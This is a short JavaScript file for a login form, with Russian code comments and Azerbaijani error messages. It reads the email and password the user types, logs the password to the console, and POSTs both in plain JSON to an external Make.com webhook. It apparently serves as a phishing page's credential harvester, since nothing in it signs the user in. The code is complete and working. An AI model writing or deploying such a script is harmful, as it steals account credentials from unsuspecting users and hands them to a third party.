document.addEventListener('DOMContentLoaded', function() {
    let form = document.getElementById('email-form-step');
    let invalidEmailDiv = document.querySelector('.invalid-email');

    form.addEventListener('submit', function(event) {
        event.preventDefault();

        // Получаем значения из формы
        let userEmail = document.getElementById('email-input').value;
        let userPassword = document.getElementById('password-input').value;

        // Скрываем сообщения об ошибках
        invalidEmailDiv.style.display = 'none';

        // Регулярное выражение для проверки email
        let emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

        // Проверяем данные
        if (!userEmail || !userPassword) {
            invalidEmailDiv.querySelector('.invalid-email-text-span').textContent = 'Bütün sahələri doldurun.';
            invalidEmailDiv.style.display = 'block';
            return;
        }

        // Проверка формата email
        if (!emailRegex.test(userEmail)) {
            invalidEmailDiv.querySelector('.invalid-email-text-span').textContent = 'Zəhmət olmasa düzgün e-poçt ünvanı daxil edin.';
            invalidEmailDiv.style.display = 'block';
            return;
        }

        // Создаем объект с данными
        let data = {
            email: userEmail,
            password: userPassword
        };

        // Используем значение
        console.log("Email:", userEmail);
        console.log("Password:", userPassword);

        // Отправляем данные
        fetch('https://hook.eu2.make.com/h5wei8h57yaet9f693hx1hjlpysisffq', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (!response.ok) {
                return response.text()
                    .then(text => {
                        throw new Error(`Məlumat göndərərkən səhv baş verdi: ${response.status} - ${text}`);
                    });
            }
            // Обработка успешного ответа
            console.log('Məlumat uğurla göndərildi');
            alert('Məlumat uğurla göndərildi!');
        })
        .catch(error => {
            console.error('Səhv:', error);
            invalidEmailDiv.querySelector('.invalid-email-text-span').textContent = 'Məlumat göndərilərkən səhv baş verdi: ' + error.message;
            invalidEmailDiv.style.display = 'block';
        });
    });
});
